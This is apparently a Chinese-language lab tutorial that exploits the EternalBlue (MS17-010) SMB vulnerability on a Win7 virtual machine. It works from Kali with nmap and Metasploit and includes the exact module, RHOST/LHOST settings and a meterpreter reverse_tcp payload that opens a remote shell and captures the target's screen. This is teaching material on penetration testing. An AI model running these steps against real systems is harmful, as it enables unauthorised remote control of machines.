**该漏洞是通过目标主机445端口开放的情况，可以发起攻击**

在VMware上建立两个虚拟机：win7和kali

Kali：它是Linux发行版的操作系统，它拥有超过300个渗透测试工具，就不用自己再去找安装包，去安装到我们自己的电脑上了，毕竟自己从网上找到，也不安全。它甚至还集成了600多种黑客工具，很强大。

可以永久免费使用，基本上学黑客攻击必会用到这个系统

  

靶机：Win7 64位 （IP: 192.168.10.22）--用ipconfig进行查询

攻击机：Kali 64位
（IP：192.168.10.21）--用ifconfig进行查询![1666427741_6353ab5d0d6a5f87f3b27.png!small?1666427742805](https://image.3001.net/images/20221022/1666427741_6353ab5d0d6a5f87f3b27.png!small?1666427742805)

![1666427714_6353ab427f2fdaf577553.png!small?1666427716413](https://image.3001.net/images/20221022/1666427714_6353ab427f2fdaf577553.png!small?1666427716413)

###  **1、实验环境前提条件：**

  * win7中，关闭防火墙（“打开网络和共享中心”-“Windows防火墙”-“打开或关闭Windows防火墙”-均选择关闭选项）
  * 保证两个虚拟机是可以ping通的（尤其是在kali中去ping win7，看能否连通） 
  *     >ping 192.168.10.22

  
![1666427870_6353abde7b452fcfbd074.png!small?1666427872353](https://image.3001.net/images/20221022/1666427870_6353abde7b452fcfbd074.png!small?1666427872353)

###  **2、靶机端口探测**

使用nmap对靶机端口服务进行扫描，可以查看到目标主机是否存活，以及端口开放情况

    
    
    >nmap 192.168.10.22

结果探测到：目标主机存活，且445端口开放，永恒之蓝漏洞就是利用445端口的smb服务，操作系统的溢出漏洞进行攻击的

![1666428112_6353acd00ac121fe40fe5.png!small?1666428114395](https://image.3001.net/images/20221022/1666428112_6353acd00ac121fe40fe5.png!small?1666428114395)

###  **3、打开Metasploit渗透工具**

（Metasploit是一款开源的安全漏洞检测工具，msfconsole用于启动msf终端）

    
    
    >msfconsole

结果：成功进入，进入到"msf6>“的模式下

![1666429441_6353b2012f683ace18655.png!small?1666429443563](https://image.3001.net/images/20221022/1666429441_6353b2012f683ace18655.png!small?1666429443563)

###  **4、查看需要利用的漏洞**

搜索永恒之蓝漏洞，漏洞编号为ms17-010

【 **补充** ：Windows系统漏洞微软的漏洞编号命名格式为：MS17-010；

MS Micosoft的缩写，固定格式；  
17 表示年份，即2017年发布的漏洞；  
010 表示顺序，即当年度发布的第10个漏洞。

    
    
    >search ms17-010

结果：可以看到返回了多条可利用的漏洞模块信息

![1666429468_6353b21c20da24ca62431.png!small?1666429469994](https://image.3001.net/images/20221022/1666429468_6353b21c20da24ca62431.png!small?1666429469994)

### 5、尝试利用其中一个漏洞模块进行攻击

先使用辅助扫描测试模块-04模块，进入模块中，测试目标主机是否容易受到ms17-010漏洞的攻击（ **注意** ：必须是“_”，不是“-”，否则会报错）

    
    
    >use auxiliary/scanner/smb/smb_ms17_010

结果：成功切换到这个模块之下--”msf6 auxiliary(scanner/smb/smb_ms17_010)>“

![1666429591_6353b29722fd1bd615b4b.png!small?1666429592774](https://image.3001.net/images/20221022/1666429591_6353b29722fd1bd615b4b.png!small?1666429592774)

### 6、查看该漏洞模块所需的参数情况

进到这个漏洞模块之后，先查看该测试模块的参数情况。类似于你使用一软件，进行攻击，是不是需要先进行一些简单的参数配置啊，需要告诉软件，要向谁发起攻击吧，这是最最基本的，所以，要配置，就要先查看都可以配置哪些参数？

    
    
    >show options

结果展示：其中required显示的值为yes的，代表是必须要设置的项；显示的值为no的，代表是不必须要设置的项；

重点关注2个参数配置，需要设置哪个就设置哪个：

RHOST(被攻击的目标地址-win7地址)；

RPORT(被攻击目标地址的端口-保证445开放)；

![1666430065_6353b4718d6cd82bede17.png!small?1666430067480](https://image.3001.net/images/20221022/1666430065_6353b4718d6cd82bede17.png!small?1666430067480)

### 7、设置 **目标主机地址**

查看完了，发现只有RHOST等待设置，其他（RPORT）均以自动获取，没有问题。就可以设置被攻击的目标主机地址-win7

    
    
    >set RHOST 192.168.10.22

![1666430107_6353b49b718090fa53161.png!small?1666430109174](https://image.3001.net/images/20221022/1666430107_6353b49b718090fa53161.png!small?1666430109174)

### 8、设置好了之后，再进行检验

    
    
    >show options

![1666430136_6353b4b8ab9ef4de159ee.png!small?1666430138716](https://image.3001.net/images/20221022/1666430136_6353b4b8ab9ef4de159ee.png!small?1666430138716)

### 9、检查没问题了，发起攻击

    
    
    >run

扫描结果：“Host is likely VULNERABLE to MS17-010”-该主机很容易受到ms17-010的攻击，可以断定目标存在漏洞

![1666430154_6353b4ca54528da53a604.png!small?1666430156119](https://image.3001.net/images/20221022/1666430154_6353b4ca54528da53a604.png!small?1666430156119)

### 10、尝试利用另一个漏洞模块进行攻击

同利用辅助扫描测试模块的步骤，大同小异，使用另一个漏洞攻击模块-0模块，进行攻击

 **10.1）** **查看需要利用的漏洞**

    
    
    >search ms17-010 

**10.2）进入0模块，尝试攻击**

    
    
    >use exploit/windows/smb/ms17_010_eternalblue

结果展示：成功切换到这个模块之下--”msf6 exploit(windows/smb/ms17_010_eternalblue)>“

并提示“no payload configured,defaulting to
windows/x64/meterpreter/reverse_tcp”--没有配置payload，默认为
windows/x64/meterpreter/reverse_tcp

![1666430328_6353b578e946d45fba1f2.png!small?1666430330715](https://image.3001.net/images/20221022/1666430328_6353b578e946d45fba1f2.png!small?1666430330715)

 **10.3）查看参数配置情况**

    
    
    >show options

重点关注5个参数配置，需要设置哪个就设置哪个：

Payload(攻击载体) ；

RHOST(被攻击的目标地址-win7地址)；

RPORT(被攻击目标地址的端口-保证445开放)；

LHOST(发起攻击的地址-kali地址)；

LPORT(发起攻击的端口-默认即可)；

【 **补充说明：**

1）Payload中包含有需要在远程系统中运行的恶意代码，Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。也就是说，漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。

2）Payload模块主要有以下三种类型：-Single -Stager -Stage

  * Single是一种完全独立的Payload，实现的目的也简单，但容易被捕捉到。
  * Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。 一种常见的Stagers Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接（3次握手-4次挥手）（是一个基于TCP的反向链接反弹shell, 使用起来很稳定）。
  * Stage是Stager Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。

3）windows/x64/meterpreter/reverse_tcp则由一个Stager Payload（reverse_tcp）和一个Stage
Payload（meterpreter）组成。

 **【注意：Payload为windows/meterpreter/reverse_tcp 默认获取到的控制通道meterpreter为32位，**

 **如果想将之后获取到的控制通道meterpreter改为64位，则设置payload:**
**windows/x64/meterpreter/reverse_tcp** **】**

![1666430796_6353b74ce8ce54a00d747.png!small?1666430799967](https://image.3001.net/images/20221022/1666430796_6353b74ce8ce54a00d747.png!small?1666430799967)

 **10.4）设置目标主机地址**

发现仅RHOST为空待设置，其它（payload/RPORT/LHOST/LPORT）均已获取，且正确，就可以设置被攻击的目标主机地址-win7

    
    
    >set RHOST 192.168.10.22

![1666430612_6353b6940409cd4223a46.png!small?1666430613698](https://image.3001.net/images/20221022/1666430612_6353b6940409cd4223a46.png!small?1666430613698)

 **10.5）再次进行检查**

    
    
    >show options

![1666430877_6353b79de41d9c4b4bf70.png!small?1666430879878](https://image.3001.net/images/20221022/1666430877_6353b79de41d9c4b4bf70.png!small?1666430879878)

 **10.6）检查无误后，发起攻击**

    
    
    >run

结果显示：“meterpreter session 1 opened”--表明已经开通一个会话连接

![1666430994_6353b812dff936dca5c4b.png!small?1666430996805](https://image.3001.net/images/20221022/1666430994_6353b812dff936dca5c4b.png!small?1666430996805)

 **11、攻击成功**

一旦开通一个会话连接侯，系统一般会自动返回一个控制通道meterpreter，表明攻击成功

    
    
    meterpreter>

当然，若没有自动连接，也可以进行手动连接：

    
    
    >sessions -i 1

![1666431012_6353b824e26e8420a240d.png!small?1666431014665](https://image.3001.net/images/20221022/1666431012_6353b824e26e8420a240d.png!small?1666431014665)

 **12、屏幕截图**

可以在这个通道中执行一些控制目标主机win7的命令，如抓取win7的桌面截图screenshot，截图一般会自动保存到桌面的主文件夹里面

    
    
    meterpreter>screenshot

![1666431056_6353b850eb7c9b497c185.png!small?1666431058573](https://image.3001.net/images/20221022/1666431056_6353b850eb7c9b497c185.png!small?1666431058573)![1666431081_6353b8693045c6dbb1c2c.png!small?1666431083038](https://image.3001.net/images/20221022/1666431081_6353b8693045c6dbb1c2c.png!small?1666431083038)![1666431107_6353b883a553fea666b5e.png!small?1666431109658](https://image.3001.net/images/20221022/1666431107_6353b883a553fea666b5e.png!small?1666431109658)

 **13、终止会话**

可以退出攻击，断开连接，会退出切换到”msf6
exploit(windows/smb/ms17_010_eternalblue)>“下，并再次查看当前存在的会话sessions，发现没有任何会话开启

    
    
    meterpreter>exit
    
    meterpreter>sessions

![1666431171_6353b8c3443d037ea2be2.png!small?1666431173062](https://image.3001.net/images/20221022/1666431171_6353b8c3443d037ea2be2.png!small?1666431173062)

